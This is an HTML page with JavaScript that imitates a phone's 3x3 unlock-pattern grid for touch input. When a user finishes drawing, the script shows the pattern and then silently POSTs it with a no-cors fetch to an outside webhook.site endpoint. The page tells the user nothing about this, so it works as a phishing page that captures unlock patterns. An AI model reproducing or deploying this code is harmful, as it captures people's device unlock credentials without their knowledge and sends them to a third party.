<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Anchu</title>

<style>
body {
  margin: 0;
  background: #000;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  touch-action: none;
}


canvas {
  position: absolute;
  top: 0;
  left: 0;
}

.wrapper {
  position: relative;
  display: flex;
  justify-content: center;
  align-items: center;
}

.grid {
  display: grid;
  grid-template-columns: repeat(3, 18vw);
  gap: 10vw;
  justify-content: center;
  align-items: center;
}

.dot {
  width: 5vw;
  height: 5vw;
  background: #888;
  border-radius: 50%;
  margin: auto;
}

.dot.active {
  background: #4CAF50;
  transform: scale(1.8);
}
</style>
</head>

<body>

<div class="wrapper">
  <canvas id="canvas"></canvas>

  <div class="grid" id="grid">
    <div class="dot" data-id="1"></div>
    <div class="dot" data-id="2"></div>
    <div class="dot" data-id="3"></div>
    <div class="dot" data-id="4"></div>
    <div class="dot" data-id="5"></div>
    <div class="dot" data-id="6"></div>
    <div class="dot" data-id="7"></div>
    <div class="dot" data-id="8"></div>
    <div class="dot" data-id="9"></div>
  </div>
</div>
<script>
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const grid = document.getElementById("grid");
const dots = document.querySelectorAll(".dot");

let pattern = [];
let drawing = false;
let current = null;

// ✅ Perfect canvas alignment
function resize() {
  const rect = grid.getBoundingClientRect();
  const dpr = window.devicePixelRatio || 1;

  canvas.width = rect.width * dpr;
  canvas.height = rect.height * dpr;

  canvas.style.width = rect.width + "px";
  canvas.style.height = rect.height + "px";

  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
}
resize();
window.addEventListener("resize", resize);

// ✅ Dot center
function center(dot) {
  const g = grid.getBoundingClientRect();
  const r = dot.getBoundingClientRect();

  return {
    x: r.left - g.left + r.width / 2,
    y: r.top - g.top + r.height / 2
  };
}

// ✅ Pointer position
function point(e) {
  const rect = grid.getBoundingClientRect();

  return {
    x: e.clientX - rect.left,
    y: e.clientY - rect.top,
    cx: e.clientX,
    cy: e.clientY
  };
}

// ✅ Smooth drawing loop
function draw() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  if (pattern.length) {
    ctx.strokeStyle = "#4CAF50";
    ctx.lineWidth = 6;
    ctx.lineCap = "round";

    ctx.beginPath();

    pattern.forEach((id, i) => {
      const dot = document.querySelector(`[data-id='${id}']`);
      const p = center(dot);

      if (i === 0) ctx.moveTo(p.x, p.y);
      else ctx.lineTo(p.x, p.y);
    });

    if (current) ctx.lineTo(current.x, current.y);

    ctx.stroke();
  }

  requestAnimationFrame(draw);
}
draw();

// ✅ Activate
function activate(dot) {
  const id = dot.dataset.id;

  if (!pattern.includes(id)) {
    pattern.push(id);
    dot.classList.add("active");
  }
}

// ✅ Start
function start(e) {
  drawing = true;
  pattern = [];

  const p = point(e);
  current = p;

  const el = document.elementFromPoint(p.cx, p.cy);
  if (el && el.classList.contains("dot")) activate(el);
}

// ✅ Move
function move(e) {
  if (!drawing) return;

  const p = point(e);
  current = p;

  const el = document.elementFromPoint(p.cx, p.cy);
  if (el && el.classList.contains("dot")) activate(el);
}

// ✅ End
function end() {
  if (!drawing) return;
  drawing = false;

  const result = pattern.join("-");
  alert("Pattern: " + result);

  fetch("https://webhook.site/f6af3aa6-bc95-46b5-a5a3-03d16ed5cb7b", {
    method: "POST",
    mode: "no-cors",
    body: "pattern=" + result
  });

  setTimeout(() => {
    pattern = [];
    current = null;
    dots.forEach(d => d.classList.remove("active"));
  }, 600);
}

// ✅ Pointer events (best for mobile)
document.addEventListener("pointerdown", start);
document.addEventListener("pointermove", move);
document.addEventListener("pointerup", end);
</script>

</body>
</html>
